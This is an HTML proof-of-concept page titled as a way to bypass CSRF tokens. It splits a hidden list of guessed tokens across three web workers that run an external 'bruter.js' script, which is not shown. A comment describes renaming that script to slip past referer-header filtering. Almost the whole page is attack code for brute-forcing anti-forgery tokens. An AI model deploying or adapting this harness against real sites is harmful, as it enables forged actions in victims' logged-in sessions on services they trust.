<html>
	<body>
		<h1>Bypass CSRF Tokens by HTML web workers</h1>
		<textarea hidden id="tokens" rows="12" cols="60">
			abcdaf
			012734
			092342
			uyagsdf
			abcdef
			09876
      </textarea>						
		<br>
		<h3>Workers results</h3>

 		<span id="workers"></span>
 		
		<script>
			function startBlock(worker, tokens) {
				worker.postMessage({
					'tokens' : tokens
				});
			}
			
			// The request will come from this script hence change the name to bypass the referer header filter bypass.
			var bruterPath ="bruter.js";

			// Divide the entire token space into different web workers. 1000/3 ~ 333 request per worker
			
			var ww1 = new Worker(bruterPath);
			// adding a listener to each worker to know when this workers are finished.
			ww1.addEventListener('message', function(e) {
				document.getElementById("workers").innerHTML += "<b>ww1</b>: " + e.data + "<br>";
			}, false);


			var ww2 = new Worker(bruterPath);
			ww2.addEventListener('message', function(e) {
				document.getElementById("workers").innerHTML += "<b>ww2</b>: " + e.data + "<br>";
			}, false);


			var ww3 = new Worker(bruterPath);
			ww3.addEventListener('message', function(e) {
				document.getElementById("workers").innerHTML += "<b>ww3</b>: " + e.data + "<br>";
			}, false);


			var tokens = document.getElementById('tokens').value.replace(/\s+/gm, '\n').split('\n');
			tokens = tokens.filter(Boolean);


			// dividing the token array
			startBlock(ww1, tokens.slice(0,333));
			startBlock(ww2, tokens.slice(333,666));
			startBlock(ww3, tokens.slice(666,tokens.length));


		</script>

		<div>
			<img src="counter.gif" />
		</div>
	</body>
</html>
